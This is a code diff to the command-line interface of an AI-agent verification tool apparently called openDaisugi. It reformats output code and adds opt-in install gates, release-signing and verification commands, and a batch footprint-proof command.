-        ))
+        result = asyncio.run(
+            d.orchestrate(
+                prompt,
+                envelope=envelope,
+                budget_tokens=budget,
+                stakes=stakes,
+                strict_budget=strict_budget,
+                synth_llm=not deterministic_synthesis,
+                max_parallel=max_parallel,
+            )
+        )
     except EnvelopeGenerationError as e:
         typer.echo(f"Envelope generation failed: {e}", err=True)
         raise typer.Exit(code=1)
@@ -1726,8 +2431,11 @@ def orchestrate_cmd(
     else:
         typer.echo(result.final_answer)
         typer.echo("")
-        typer.echo(f"— orchestration ({result.status}"
-                   + (", reused pathway" if result.reused_pathway else "") + ") —")
+        typer.echo(
+            f"— orchestration ({result.status}"
+            + (", reused pathway" if result.reused_pathway else "")
+            + ") —"
+        )
         # When the run didn't succeed, say WHY — otherwise the reader sees a final
         # answer plus a bare "failed" with no explanation (common cause: the
         # claude -p backend couldn't get tool permission; see DAISUGI_CLAUDE_ARGS).
@@ -1736,8 +2444,10 @@ def orchestrate_cmd(
                 if s.status in ("failed", "aborted", "rejected_halted") and s.error:
                     typer.echo(f"  {s.step_id}: {s.status} — {s.error}", err=True)
         for s in result.sizings:
-            typer.echo(f"  {s.step_id}: difficulty={s.difficulty:.2f} → {s.tier} ({s.model})"
-                       + ("  [downgraded]" if s.downgraded else ""))
+            typer.echo(
+                f"  {s.step_id}: difficulty={s.difficulty:.2f} → {s.tier} ({s.model})"
+                + ("  [downgraded]" if s.downgraded else "")
+            )
         b = result.budget
         spent = f"{b.spent}" + (f"/{b.total}" if b.total is not None else "")
         typer.echo(f"  budget: {spent} tokens across {b.step_count} model call(s)")
@@ -1757,8 +2467,12 @@ def models_cmd(
         None,
         help="Trusted HF repo to resolve+pin (e.g. mozilla-ai/Qwen2.5-0.5B-Instruct-llamafile). Omit to discover.",
     ),
-    suffix: str = typer.Option(".llamafile", "--suffix", help="File suffix to resolve (.llamafile or .gguf)."),
-    pull: bool = typer.Option(False, "--pull", help="Download the resolved file (pinned to its commit)."),
+    suffix: str = typer.Option(
+        ".llamafile", "--suffix", help="File suffix to resolve (.llamafile or .gguf)."
+    ),
+    pull: bool = typer.Option(
+        False, "--pull", help="Download the resolved file (pinned to its commit)."
+    ),
     json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
 ) -> None:
     """Discover or resolve a trustworthy, commit-pinned local model from the Hub.
@@ -1791,9 +2505,17 @@ def models_cmd(
         path = mr.download_pinned(ref, allow_download=True)
 
     if json_output:
-        typer.echo(json.dumps(
-            {"repo_id": ref.repo_id, "filename": ref.filename, "revision": ref.revision,
-             "downloaded_path": path}, indent=2))
+        typer.echo(
+            json.dumps(
+                {
+                    "repo_id": ref.repo_id,
+                    "filename": ref.filename,
+                    "revision": ref.revision,
+                    "downloaded_path": path,
+                },
+                indent=2,
+            )
+        )
         return
     typer.echo(f"repo:     {ref.repo_id}")
     typer.echo(f"file:     {ref.filename}")
@@ -1828,12 +2550,16 @@ def quickstart_cmd(
     tier1 = load_configured_tier1(data_dir)
 
     typer.echo("openDaisugi quickstart — your day-one path\n")
-    typer.echo(f"1. Hardware: {profile.system}/{profile.arch}, ~{profile.model_budget_gb}GB model budget")
+    typer.echo(
+        f"1. Hardware: {profile.system}/{profile.arch}, ~{profile.model_budget_gb}GB model budget"
+    )
     if tier1 is not None:
         typer.echo(f"   ✓ local model already wired: {getattr(tier1, 'model', '?')}")
     else:
-        typer.echo(f"   → recommended local model: a {rec.size_class}-class model at {rec.quant} "
-                   f"via {rec.runtime} (provisional — qualify on your box). Run `daisugi setup`.")
+        typer.echo(
+            f"   → recommended local model: a {rec.size_class}-class model at {rec.quant} "
+            f"via {rec.runtime} (provisional — qualify on your box). Run `daisugi setup`."
+        )
     by = ", ".join(f"{k}: {v}" for k, v in sorted(by_harness.items())) or "none found"
     typer.echo(f"\n2. Existing transcripts discovered: {len(transcripts)} ({by})")
     typer.echo(f"   journal so far: {rep.journal_total} traces, {rep.pathway_count} pathways")
@@ -1854,13 +2580,16 @@ def quickstart_cmd(
 def setup_cmd(
     data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
     endpoint: str = typer.Option(
-        None, "--endpoint",
+        None,
+        "--endpoint",
         help="OpenAI-compatible local /v1 URL to qualify (e.g. http://localhost:8080/v1).",
     ),
     model: str = typer.Option(
         None, "--model", help="Model name served by --endpoint (required with --endpoint)."
     ),
-    threshold: float = typer.Option(0.8, "--threshold", help="Min valid-envelope pass rate to promote."),
+    threshold: float = typer.Option(
+        0.8, "--threshold", help="Min valid-envelope pass rate to promote."
+    ),
     repeats: int = typer.Option(1, "--repeats", help="Sample each probe task N times."),
     wire: bool = typer.Option(False, "--wire", help="Persist the model as Tier-1 if it qualifies."),
     json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
@@ -1876,7 +2605,10 @@ def setup_cmd(
     from opendaisugi.local_setup import qualify_local_model, write_tier1_config
 
     if endpoint and not model:
-        typer.echo("--model is required with --endpoint (the model name the local server serves).", err=True)
+        typer.echo(
+            "--model is required with --endpoint (the model name the local server serves).",
+            err=True,
+        )
         raise typer.Exit(code=2)
 
     profile = detect_hardware()
@@ -1896,65 +2628,101 @@ def setup_cmd(
     if json_output:
         payload = {
             "hardware": {
-                "system": profile.system, "arch": profile.arch, "cpu_count": profile.cpu_count,
-                "ram_gb": profile.ram_gb, "vram_gb": profile.vram_gb, "gpu_name": profile.gpu_name,
-                "unified_memory": profile.unified_memory, "model_budget_gb": profile.model_budget_gb,
+                "system": profile.system,
+                "arch": profile.arch,
+                "cpu_count": profile.cpu_count,
+                "ram_gb": profile.ram_gb,
+                "vram_gb": profile.vram_gb,
+                "gpu_name": profile.gpu_name,
+                "unified_memory": profile.unified_memory,
+                "model_budget_gb": profile.model_budget_gb,
             },
             "recommendation": {
-                "size_class": rec.size_class, "params_b_max": rec.params_b_max, "quant": rec.quant,
-                "runtime": rec.runtime, "est_download_gb": rec.est_download_gb,
-                "candidate_families": rec.candidate_families, "provisional": rec.provisional,
+                "size_class": rec.size_class,
+                "params_b_max": rec.params_b_max,
+                "quant": rec.quant,
+                "runtime": rec.runtime,
+                "est_download_gb": rec.est_download_gb,
+                "candidate_families": rec.candidate_families,
+                "provisional": rec.provisional,
                 "rationale": rec.rationale,
             },
-            "qualification": None if qual is None else {
-                "attempts": qual.attempts, "valid": qual.valid, "pass_rate": qual.pass_rate,
-                "passed": qual.passed, "threshold": qual.threshold, "wired": wired,
+            "qualification": None
+            if qual is None
+            else {
+                "attempts": qual.attempts,
+                "valid": qual.valid,
+                "pass_rate": qual.pass_rate,
+                "passed": qual.passed,
+                "threshold": qual.threshold,
+                "wired": wired,
             },
         }
         typer.echo(json.dumps(payload, indent=2))
         return
 
-    typer.echo(f"Hardware: {profile.system}/{profile.arch}, {profile.cpu_count} CPU"
-               + (f", {profile.ram_gb}GB RAM" if profile.ram_gb else ", RAM undetected")
-               + (f", {profile.vram_gb}GB VRAM ({profile.gpu_name})" if profile.has_discrete_gpu else ", no discrete GPU"))
+    typer.echo(
+        f"Hardware: {profile.system}/{profile.arch}, {profile.cpu_count} CPU"
+        + (f", {profile.ram_gb}GB RAM" if profile.ram_gb else ", RAM undetected")
+        + (
+            f", {profile.vram_gb}GB VRAM ({profile.gpu_name})"
+            if profile.has_discrete_gpu
+            else ", no discrete GPU"
+        )
+    )
     typer.echo(f"Model budget: ~{profile.model_budget_gb}GB")
     typer.echo("")
-    typer.echo(f"Recommended: a {rec.size_class}-class instruct model at {rec.quant} "
-               f"via {rec.runtime} (~{rec.est_download_gb}GB).")
-    typer.echo(f"  candidate families (your pick, none verified-best): {', '.join(rec.candidate_families)}")
+    typer.echo(
+        f"Recommended: a {rec.size_class}-class instruct model at {rec.quant} "
+        f"via {rec.runtime} (~{rec.est_download_gb}GB)."
+    )
+    typer.echo(
+        f"  candidate families (your pick, none verified-best): {', '.join(rec.candidate_families)}"
+    )
     typer.echo(f"  {rec.rationale}")
     typer.echo("")
     if qual is None:
         typer.echo("Get a local server running (one file, no install), then qualify + wire it:")
         typer.echo("  1. Find a trusted, commit-pinned model llamafile:  daisugi models")
-        typer.echo("     (canonical engine repo: github.com/mozilla-ai/llamafile; model org: huggingface.co/mozilla-ai)")
+        typer.echo(
+            "     (canonical engine repo: github.com/mozilla-ai/llamafile; model org: huggingface.co/mozilla-ai)"
+        )
         typer.echo("  2. Serve it:  ./<model>.llamafile --server --port 8080 --nobrowser")
-        typer.echo("  3. Qualify:   daisugi setup --endpoint http://localhost:8080/v1 --model <name> --wire")
+        typer.echo(
+            "  3. Qualify:   daisugi setup --endpoint http://localhost:8080/v1 --model <name> --wire"
+        )
     else:
         verdict = "PASSED" if qual.passed else "FAILED"
-        typer.echo(f"Qualification: {verdict} — {qual.valid}/{qual.attempts} valid envelopes "
-                   f"(pass rate {qual.pass_rate:.0%}, threshold {qual.threshold:.0%}).")
+        typer.echo(
+            f"Qualification: {verdict} — {qual.valid}/{qual.attempts} valid envelopes "
+            f"(pass rate {qual.pass_rate:.0%}, threshold {qual.threshold:.0%})."
+        )
         if wired:
-            typer.echo(f"  → Wired as Tier-1 in {data_dir}; `daisugi onboard`/`tend` will now defer to it.")
+            typer.echo(
+                f"  → Wired as Tier-1 in {data_dir}; `daisugi onboard`/`tend` will now defer to it."
+            )
         elif qual.passed and not wire:
             typer.echo("  → Passed. Re-run with --wire to persist it as Tier-1.")
         else:
             errored = sum(1 for _, kind in qual.outcomes if kind == "error")
             if errored == qual.attempts:
-                typer.echo("  → ALL attempts errored — this is a wiring problem, not model capacity. "
-                           "Check the server is reachable at --endpoint and serving /v1, and that "
-                           "--model matches the name it serves.")
+                typer.echo(
+                    "  → ALL attempts errored — this is a wiring problem, not model capacity. "
+                    "Check the server is reachable at --endpoint and serving /v1, and that "
+                    "--model matches the name it serves."
+                )
             else:
-                typer.echo("  → Not promoted. Try a larger model, a higher quant, or lower --threshold deliberately.")
+                typer.echo(
+                    "  → Not promoted. Try a larger model, a higher quant, or lower --threshold deliberately."
+                )
 
 
 @app.command("status")
 def status_cmd(
-    data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."
-    ),
+    data_dir: Path = typer.Option(DEFAULT_DATA_DIR, "--data-dir", help="Daisugi data directory."),
     threshold: float = typer.Option(
-        DEFAULT_PATHWAY_THRESHOLD, "--threshold",
+        DEFAULT_PATHWAY_THRESHOLD,
+        "--threshold",
         help="Pathway retrieval threshold to display.",
     ),
     json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
@@ -1969,6 +2737,7 @@ def status_cmd(
         payload["data_dir"] = str(rep.data_dir)
         payload["token_savings_ready"] = rep.token_savings_ready
         payload["trust_ready"] = rep.trust_ready
+        payload["shell_decomposition_ready"] = rep.shell_decomposition_ready
         typer.echo(json.dumps(payload, indent=2))
         return
 
@@ -1993,6 +2762,16 @@ def status_cmd(
         f"({rep.journal_passed} verified, {rep.journal_failed} rejected)"
     )
     typer.echo("  • verification: strict at stakes high/physical (rejects unprovable invariants)")
+    if not rep.shell_decomposition_enabled:
+        typer.echo("  • compound shell (`a && b`): rejected outright (ADR-0010 opt-in is off)")
+    elif rep.shell_decomposition_ready:
+        typer.echo("  • compound shell (`a && b`): decomposed, every head allowlist-checked")
+    else:
+        typer.echo(
+            f"  {no} compound shell: the opt-in is ON but the bash grammar is MISSING, "
+            "so every compound command is denied — install it with: "
+            "uv add 'opendaisugi[shell]'"
+        )
     typer.echo(
         f"  → {ok + ' journal populated; replay any action with `daisugi journal replay <id>`' if rep.trust_ready else no + ' empty — run `daisugi onboard` or start capturing'}"
     )
@@ -2003,7 +2782,9 @@ def status_cmd(
 
     configured = load_configured_tier1(data_dir)
     if configured is not None:
-        typer.echo(f"  {ok} wired: {getattr(configured, 'model', '?')} @ {getattr(configured, 'base_url', 'default')}")
+        typer.echo(
+            f"  {ok} wired: {getattr(configured, 'model', '?')} @ {getattr(configured, 'base_url', 'default')}"
+        )
         typer.echo("  → onboard/tend defer bulk envelope generation to your local model")
     else:
         prof = detect_hardware()
@@ -2019,13 +2800,12 @@ def status_cmd(
 def journal_search_cmd(
     query: str = typer.Argument(..., help="Free-text query to match against trace tasks."),
     data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir",
+        DEFAULT_DATA_DIR,
+        "--data-dir",
         help="Root data directory containing journal/",
     ),
     limit: int = typer.Option(10, "--limit", help="Maximum number of results."),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit result rows as JSON array."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit result rows as JSON array."),
 ) -> None:
     """Semantic search over journal traces (requires [search] extra)."""
     journal = Journal(data_dir=data_dir)
@@ -2052,12 +2832,11 @@ def journal_search_cmd(
 def journal_replay_cmd(
     trace_id: str = typer.Argument(..., help="Trace id (e.g. 2026-04-09-a1b2c3d4)."),
     data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir",
+        DEFAULT_DATA_DIR,
+        "--data-dir",
         help="Root data directory containing journal/",
     ),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit ReplayResult as JSON."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit ReplayResult as JSON."),
 ) -> None:
     """Re-run verify() on a stored trace and report drift."""
     journal = Journal(data_dir=data_dir)
@@ -2095,12 +2874,11 @@ def journal_replay_cmd(
 @journal_app.command("stats")
 def journal_stats_cmd(
     data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir",
+        DEFAULT_DATA_DIR,
+        "--data-dir",
         help="Root data directory containing journal/",
     ),
-    json_output: bool = typer.Option(
-        False, "--json", help="Emit JournalStats as JSON."
-    ),
+    json_output: bool = typer.Option(False, "--json", help="Emit JournalStats as JSON."),
 ) -> None:
     """Print aggregate stats from the journal index."""
     journal = Journal(data_dir=data_dir)
@@ -2117,34 +2895,46 @@ def journal_stats_cmd(
 @journal_app.command("parse")
 def journal_parse_cmd(
     transcript: Path = typer.Argument(
-        ..., exists=True, dir_okay=False, readable=True,
+        ...,
+        exists=True,
+        dir_okay=False,
+        readable=True,
         help="Path to a Claude Code .jsonl transcript.",
     ),
     output: Path = typer.Option(
-        ..., "-o", "--output",
+        ...,
+        "-o",
+        "--output",
         help="Path to write the episodes YAML/JSON file.",
     ),
     format_name: str = typer.Option(
-        "claude-code", "--format",
+        "claude-code",
+        "--format",
         help="Parser format (default: claude-code).",
     ),
     min_tools: int = typer.Option(
-        3, "--min-tools",
+        3,
+        "--min-tools",
         help="Merge episodes below this tool-call threshold.",
     ),
     max_tools: int = typer.Option(
-        30, "--max-tools",
+        30,
+        "--max-tools",
         help="LLM-split episodes above this tool-call threshold.",
     ),
     model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
+        "anthropic/claude-sonnet-4-20250514",
+        "--model",
         help="Model for LLM splitting (rarely needed).",
     ),
     json_output: bool = typer.Option(
-        False, "--json", help="Write JSON instead of YAML.",
+        False,
+        "--json",
+        help="Write JSON instead of YAML.",
     ),
     llm: str = typer.Option(
-        "litellm", "--llm",
+        "litellm",
+        "--llm",
         help="LLM backend: 'litellm' (default) or 'claude-code' (uses claude -p subprocess).",
     ),
 ) -> None:
@@ -2181,27 +2971,27 @@ def journal_parse_cmd(
 @journal_app.command("ingest")
 def journal_ingest_cmd(
     episodes_file: Path = typer.Argument(
-        ..., exists=True, dir_okay=False, readable=True,
+        ...,
+        exists=True,
+        dir_okay=False,
+        readable=True,
         help="Path to an episodes YAML/JSON file from 'journal parse'.",
     ),
-    concurrency: int = typer.Option(
-        5, "--concurrency",
-        help="Max parallel envelope generation calls.",
-    ),
-    model: str = typer.Option(
-        "anthropic/claude-sonnet-4-20250514", "--model",
-        help="Model for envelope generation.",
-    ),
     data_dir: Path = typer.Option(
-        DEFAULT_DATA_DIR, "--data-dir",
+        DEFAULT_DATA_DIR,
+        "--data-dir",
         help="Root data directory containing journal/",
     ),
     dry_run: bool = typer.Option(
-        False, "--dry-run",
+        False,
+        "--dry-run",
         help="Show what would be ingested without LLM calls.",
     ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
     json_output: bool = typer.Option(
-        False, "--json", help="Machine-readable JSON output.",
+        False,
+        "--json",
+        help="Machine-readable JSON output.",
     ),
 ) -> None:
     """Ingest parsed episodes into the journal."""
@@ -2217,14 +3007,15 @@ def journal_ingest_cmd(
         typer.echo(f"Invalid episodes file: {e}", err=True)
         raise typer.Exit(code=2) from e
 
+    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
+    _warn_if_decomposition_unusable(decompose)
     journal = Journal(data_dir=data_dir)
     summary = asyncio.run(
         ingest_episodes(
             parse_result,
             journal,
-            concurrency=concurrency,
-            model=model,
             dry_run=dry_run,
+            allow_shell_decomposition=decompose,
         )
     )
 
@@ -2258,10 +3049,14 @@ def journal_ingest_cmd(
                 detail = ep.error
             typer.echo(f'{ep.episode_id}  {status} "{ep.task}" ({detail})')
         typer.echo("")
-        typer.echo(f"Ingested {summary.total} episodes from {episodes_file.name}")
-        typer.echo(f"  {summary.passed} passed verification")
-        typer.echo(f"  {summary.failed} failed verification")
+        verb = "Previewed" if dry_run else "Ingested"
+        typer.echo(f"{verb} {summary.total} episodes from {episodes_file.name}"
+                   + (" (dry run — nothing written)" if dry_run else ""))
+        typer.echo(f"  {summary.passed} {'would pass' if dry_run else 'passed'} verification")
+        typer.echo(f"  {summary.failed} {'would fail' if dry_run else 'failed'} verification")
         typer.echo(f"  {summary.skipped} skipped (already in journal)")
+        if summary.preview_skipped:
+            typer.echo(f"  {summary.preview_skipped} too large to preview")
         if summary.errored:
             typer.echo(f"  {summary.errored} errored")
 
@@ -2271,25 +3066,64 @@ def journal_ingest_cmd(
 
 @app.command("install")
 def install_cmd(
-    dry_run: bool = typer.Option(False, "--dry-run", help="Show what would change without writing anything."),
+    dry_run: bool = typer.Option(
+        False, "--dry-run", help="Show what would change without writing anything."
+    ),
     yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation prompt."),
-    print_skill: bool = typer.Option(False, "--print-skill", help="Print the opendaisugi-checklist skill content to stdout."),
+    print_skill: bool = typer.Option(
+        False, "--print-skill", help="Print the opendaisugi-checklist skill content to stdout."
+    ),
     do_uninstall: bool = typer.Option(False, "--uninstall", help="Reverse all managed changes."),
-    runtime: list[str] = typer.Option(None, "--runtime", help="Target named runtime(s) only, e.g. --runtime claude."),
+    runtime: list[str] = typer.Option(
+        None, "--runtime", help="Target named runtime(s) only, e.g. --runtime claude."
+    ),
+    gate: bool = typer.Option(
+        False,
+        "--gate/--no-gate",
+        help="Also install the ADR-0007 fail-closed verify hook (opt-in; shadow by default).",
+    ),
+    enforce: bool = typer.Option(
+        False,
+        "--enforce/--shadow",
+        help="Gate mode: --enforce denies out-of-envelope calls; --shadow (default) only "
+        "observes. Only meaningful together with --gate.",
+    ),
+    gateway: bool = typer.Option(
+        False,
+        "--gateway/--no-gateway",
+        help="Also point the harness at the local token-saving gateway (opt-in).",
+    ),
+    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
+    base_url: str = typer.Option(
+        "http://127.0.0.1:8787",
+        "--base-url",
+        help="Gateway base_url to wire in when --gateway is set.",
+    ),
 ) -> None:
     """Wire openDaisugi into every detected agent harness.
 
-    Detects Claude Code, Codex, Hermes, and OpenClaw and installs three layers:
-    the opendaisugi-checklist skill (discovered on demand — no per-session cost),
-    the MCP tool server, and a passive capture hook that feeds distillation.
-    All changes are idempotent, backed up, and reversible with --uninstall.
+    Detects Claude Code, Codex, Hermes, and OpenClaw and installs four layers
+    by default: the opendaisugi-checklist skill (discovered on demand — no
+    per-session cost), the MCP tool server, a passive capture hook that feeds
+    distillation, and pathway-routing instructions. All changes are
+    idempotent, backed up, and reversible with --uninstall.
+
+    Two more layers are opt-in (ADR-0013, "one install that both saves and
+    verifies"): --gate installs the fail-closed ADR-0007 verify hook
+    (Claude Code, shadow unless --enforce), and --gateway points the harness
+    at the local token-saving gateway (Claude Code and OpenClaw only — Codex
+    and Hermes speak an OpenAI wire the gateway doesn't emit, so they are
+    reported as an honest gap rather than silently skipped).
     """
     if print_skill:
         from opendaisugi.install import print_skill as _print_skill
+
         typer.echo(_print_skill())
         return
 
     from opendaisugi.install import (
+        DEFAULT_LAYERS,
+        Layer,
         _select_runtimes,
         detect_runtimes,
     )
@@ -2321,20 +3155,56 @@ def install_cmd(
                 typer.echo(f"  {f}")
         return
 
+    selected_layers = set(DEFAULT_LAYERS)
+    if gate:
+        selected_layers.add(Layer.GATE)
+    if gateway:
+        selected_layers.add(Layer.BASE_URL)
+
+    if enforce and not gate:
+        typer.echo("Note: --enforce only applies with --gate; no gate hook will be installed.")
+
     typer.echo("\nDetected runtimes:")
     for rt in runtimes:
         typer.echo(f"  ✓ {rt.name}")
 
+    plans = {
+        rt.name: rt.plan(home, selected_layers, enforce=enforce, base_url=base_url)
+        for rt in runtimes
+    }
+
     typer.echo("\nopenDaisugi will make these changes:\n")
     for rt in runtimes:
         typer.echo(f"[{rt.name}]")
-        for step in rt.plan(home):
+        for step in plans[rt.name]:
             target_hint = f"  → {step.target}" if step.target else ""
-            typer.echo(f"  + [{step.layer.value}] {step.description}{target_hint}")
+            marker = "+" if step.supported else "!"
+            typer.echo(f"  {marker} [{step.layer.value}] {step.description}{target_hint}")
+        typer.echo("")
+
+    gap_lines = [
+        f"  [{rt.name}] {step.layer.value}: {step.description}"
+        for rt in runtimes
+        for step in plans[rt.name]
+        if not step.supported
+    ]
+    if gap_lines:
+        typer.echo("Honest gaps (selected but not wired for this harness):")
+        for line in gap_lines:
+            typer.echo(line)
         typer.echo("")
 
     typer.echo("Skill is discovered on demand — zero added tokens for simple sessions.")
     typer.echo("Tool calls are captured to ~/.opendaisugi/captures/ for distillation.\n")
+
+    if Layer.GATE in selected_layers:
+        # The gate hook is wired here; the policy it checks against is not. With
+        # no envelope registered, enforce mode denies every call.
+        typer.echo(
+            "The gate checks each call against a registered envelope — this install "
+            "writes the hook, not the policy. Run `daisugi gate init` to register one "
+            "(add --allow-shell-decomposition to admit `a && b` and pipes).\n"
+        )
 
     if dry_run:
         typer.echo("Dry run — no files written.")
@@ -2346,7 +3216,14 @@ def install_cmd(
             typer.echo("Aborted.")
             raise typer.Exit(code=0)
 
-    result = _install(home=home, yes=True, runtimes=runtimes)
+    result = _install(
+        home=home,
+        yes=True,
+        runtimes=runtimes,
+        layers=selected_layers,
+        enforce=enforce,
+        base_url=base_url,
+    )
 
     if result.modified_files:
         typer.echo("\nDone. Files modified:")
@@ -2355,6 +3232,203 @@ def install_cmd(
         typer.echo("\nRestart your agent session to pick up the changes.")
     else:
         typer.echo("\nAll runtimes were already configured — nothing changed.")
+
+    # Persist the compound-shell default. This is the only channel that reaches
+    # `hook auto-tend`, which runs from cron and from a detached spawn — no argv
+    # to carry a flag, stdout and stderr on DEVNULL.
+    if allow_shell_decomposition is not None:
+        from opendaisugi.config import load_config, save_config
+
+        cfg_path = home / ".opendaisugi" / "config.yaml"
+        save_config(
+            load_config(cfg_path).model_copy(
+                update={"shell_allow_decomposition": allow_shell_decomposition}
+            ),
+            cfg_path,
+        )
+        state = "on" if allow_shell_decomposition else "off"
+        typer.echo(
+            f"Compound-shell decomposition default: {state} ({cfg_path}) — config is "
+            "your data, so it survives --uninstall; edit or delete the file to reset it."
+        )
+        _warn_if_decomposition_unusable(allow_shell_decomposition)
+
+    # Ask once whether to distil repeated tasks in the background (Phase A).
+    # Interactive only; a --yes install leaves consent unasked (opt-in, never
+    # assumed). Distillation affects only cost — the guard enforces safety.
+    if not yes:
+        from opendaisugi.config import ensure_auto_tend_consent, load_config
+
+        cfg_path = home / ".opendaisugi" / "config.yaml"
+        if load_config(cfg_path).auto_tend is None:
+            after = ensure_auto_tend_consent(
+                load_config(cfg_path),
+                lambda: typer.confirm(
+                    "\nLet openDaisugi distil your repeated tasks in the background, "
+                    "so reuse compounds automatically? (only affects cost — the "
+                    "guard enforces safety either way)",
+                    default=True,
+                ),
+                path=cfg_path,
+            )
+            if after.auto_tend:
+                typer.echo(
+                    "Background distillation is ON — no cron needed: your capture "
+                    "hook kicks off a rate-limited tend on its own. (You can also "
+                    "run `daisugi hook auto-tend` any time.)"
+                )
+            else:
+                typer.echo("Left OFF — run `daisugi tend` yourself whenever you want it.")
+
+
+@release_app.command("keygen")
+def release_keygen_cmd(
+    out_dir: Path = typer.Option(
+        Path.cwd(), "--out-dir", help="Directory to write the keypair into."
+    ),
+    name: str = typer.Option("release_signing", "--name", help="Key file basename."),
+) -> None:
+    """Generate an ed25519 release-signing keypair.
+
+    Writes ``<name>.key`` (private, chmod 600) and ``<name>.pub`` (public). Keep
+    the private half OFFLINE — this command never uploads or registers anything.
+    Publish the ``.pub`` and have downloaders add it to their trusted-signer
+    registry (``daisugi`` uses ``~/.opendaisugi/trusted_signers.json``).
+    """
+    from opendaisugi.signing import generate_keypair
+
+    out_dir.mkdir(parents=True, exist_ok=True)
+    priv_b64, pub_b64 = generate_keypair()
+    priv_path = out_dir / f"{name}.key"
+    pub_path = out_dir / f"{name}.pub"
+    priv_path.write_text(priv_b64 + "\n", encoding="utf-8")
+    priv_path.chmod(0o600)
+    pub_path.write_text(pub_b64 + "\n", encoding="utf-8")
+    typer.echo(f"private key → {priv_path} (chmod 600 — keep it offline)")
+    typer.echo(f"public key  → {pub_path}")
+    typer.echo(f"public key (b64): {pub_b64}")
+
+
+@release_app.command("sign")
+def release_sign_cmd(
+    artifacts: list[Path] = typer.Argument(..., help="Release artifact files to sign."),
+    version: str = typer.Option(..., "--version", help="Release version string."),
+    key: Path = typer.Option(..., "--key", help="Path to the base64 ed25519 private key."),
+    signer: str = typer.Option(..., "--signer", help="Signer name to bind into the manifest."),
+    out: Path = typer.Option(Path("release-manifest.json"), "--out", "-o"),
+) -> None:
+    """Build a SHA-256 manifest over ARTIFACTS and sign it."""
+    from datetime import datetime, timezone
+
+    from opendaisugi.release import build_manifest, dump_manifest, sign_manifest
+
+    missing = [str(a) for a in artifacts if not a.exists()]
+    if missing:
+        typer.echo(f"no such artifact(s): {', '.join(missing)}", err=True)
+        raise typer.Exit(code=2)
+    created_at = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+    manifest = build_manifest(list(artifacts), version=version, created_at=created_at)
+    priv = key.read_text(encoding="utf-8").strip()
+    signed = sign_manifest(manifest, priv, signer=signer)
+    dump_manifest(signed, out)
+    typer.echo(f"signed manifest ({len(signed['artifacts'])} artifacts) → {out}")
+
+
+@release_app.command("verify")
+def release_verify_cmd(
+    manifest_path: Path = typer.Argument(..., help="Path to the signed release manifest."),
+    artifact_dir: Path = typer.Option(
+        Path.cwd(), "--artifact-dir", help="Directory holding the artifacts to check."
+    ),
+    signer: list[str] = typer.Option(
+        None,
+        "--signer",
+        help="Trusted signer name(s) to accept. Repeatable. "
+        "Default: every signer in the local registry.",
+    ),
+    registry_path: Path = typer.Option(
+        None,
+        "--registry",
+        help="Trusted-signer registry JSON (default: ~/.opendaisugi/trusted_signers.json).",
+    ),
+) -> None:
+    """Verify a release: trusted signature AND intact artifacts. Fails closed."""
+    from opendaisugi.release import load_manifest, verify_release
+    from opendaisugi.signing import TrustedSignerRegistry, default_registry_path
+
+    reg = TrustedSignerRegistry.load(registry_path or default_registry_path())
+    signer_names = signer or reg.names()
+    if not signer_names:
+        typer.echo(
+            f"no trusted signers: add the release pubkey to {reg.path} or pass --signer",
+            err=True,
+        )
+        raise typer.Exit(code=1)
+
+    manifest = load_manifest(manifest_path)
+    result = verify_release(
+        manifest,
+        artifact_dir=artifact_dir,
+        registry=reg,
+        signer_names=signer_names,
+    )
+    if result.ok:
+        typer.echo(f"OK — {result.reason} (signer: {result.signer})")
+        raise typer.Exit(code=0)
+    typer.echo(f"FAILED — {result.reason}", err=True)
+    raise typer.Exit(code=1)
+
+
+@batch_app.command("prove")
+def batch_prove_cmd(
+    declaration: Path = typer.Argument(..., help="Path to a BatchDeclaration JSON."),
+    envelope: Path = typer.Option(
+        ..., "--envelope", "-e", help="Envelope JSON to prove the footprint against."
+    ),
+) -> None:
+    """Statically prove a declared batch before any iteration.
+
+    Resolves every item to its concrete write-set, proves each write is inside both
+    the envelope and the declared footprint F using the same concrete matcher the
+    runtime gate uses, and probes reversibility. Exits non-zero (fail-closed) if the
+    program is non-batchable, any write is unprovable or under-declared, or any target
+    would be irreversible.
+    """
+    from opendaisugi.batch import (
+        BatchDeclaration,
+        classify_declaration,
+        prove_footprint,
+        would_be_reversible,
+    )
+    from opendaisugi.models import Envelope
+
+    decl = BatchDeclaration.model_validate_json(declaration.read_text())
+    env = Envelope.model_validate_json(envelope.read_text())
+
+    cls = classify_declaration(decl)
+    if not cls.batchable:
+        kinds = ", ".join(sorted({nb["type"] for nb in cls.non_batchable}))
+        typer.echo(
+            f"NOT BATCHABLE — program contains non-batchable step kind(s): {kinds}", err=True
+        )
+        raise typer.Exit(code=1)
+
+    proof = prove_footprint(decl, env)
+    for w in proof.resolved_writes:
+        typer.echo(f"  write: {w}")
+    irreversible = [w for w in proof.resolved_writes if not would_be_reversible(w)]
+
+    if proof.ok and not irreversible:
+        typer.echo(
+            f"PROVABLE — {len(proof.resolved_writes)} write(s), all inside the "
+            "envelope and the declared footprint F; one proof covers all N."
+        )
+        raise typer.Exit(code=0)
+    if not proof.ok:
+        typer.echo(f"UNPROVABLE — {proof.reason}", err=True)
+    if irreversible:
+        typer.echo(f"IRREVERSIBLE TARGETS (cannot enter a batch): {irreversible}", err=True)
+    raise typer.Exit(code=1)
 
 
 if __name__ == "__main__":  # enable `python -m opendaisugi.cli ...`
